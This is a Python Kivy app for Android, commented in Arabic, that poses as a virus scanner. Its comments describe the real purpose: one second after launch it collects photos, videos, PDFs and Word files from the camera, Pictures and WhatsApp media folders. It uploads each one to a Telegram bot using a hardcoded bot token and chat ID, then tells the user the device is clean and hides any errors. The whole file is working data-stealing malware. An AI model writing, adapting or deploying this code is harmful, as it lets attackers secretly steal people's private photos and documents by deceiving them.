import os
import requests
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from kivy.utils import platform

# ============================================================
# إعدادات بوت التلجرام (يجب تغيير هذه القيم)
# ============================================================
BOT_TOKEN = "8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28" 
CHAT_ID = "7145266755"
# ============================================================

class VirusScannerApp(App):
    def build(self):
        # إنشاء واجهة بسيطة جداً توهم المستخدم بالفحص
        self.layout = BoxLayout(orientation='vertical')
        self.label = Label(
            text="جاري تشغيل فحص الفيروسات...\nالرجاء الانتظار", 
            font_size='22sp', 
            halign='center'
        )
        self.layout.add_widget(self.label)
        
        # تشغيل عملية سحب الملفات بعد ثانية واحدة من فتح التطبيق
        Clock.schedule_once(self.start_stealing, 1)
        return self.layout

    def start_stealing(self, dt):
        """دالة للبحث عن الملفات وإرسالها في الخلفية"""
        try:
            # تحديد المجلدات المستهدفة في أندرويد (الصور والفيديوهات)
            target_paths = [
                '/sdcard/DCIM/Camera', 
                '/sdcard/Pictures', 
                '/sdcard/WhatsApp/Media'
            ]
            
            found_files = 0
            for path in target_paths:
                if os.path.exists(path):
                    for file in os.listdir(path):
                        # سحب الصور والفيديوهات والملفات الأساسية
                        if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx')):
                            file_path = os.path.join(path, file)
                            if self.send_to_telegram(file_path):
                                found_files += 1
            
            # تحديث الواجهة لإيهام المستخدم بأن الفحص انتهى بنجاح
            self.label.text = "تم الفحص بنجاح!\n\nالنتيجة: لا توجد فيروسات ✅\nجهازك آمن تماماً"
            
        except Exception as e:
            # في حال حدوث خطأ لا نظهره للمستخدم لكي لا يشك في التطبيق
            self.label.text = "جاري تحديث قاعدة البيانات...\nالرجاء الانتظار"

    def send_to_telegram(self, file_path):
        """دالة إرسال الملف إلى بوت التلجرام"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                payload = {'chat_id': CHAT_ID}
                files = {'document': f}
                # إرسال الملف باستخدام مكتبة requests
                response = requests.post(url, data=payload, files=files, timeout=10)
                return response.status_code == 200
        except:
            return False

if __name__ == '__main__':
    VirusScannerApp().run()
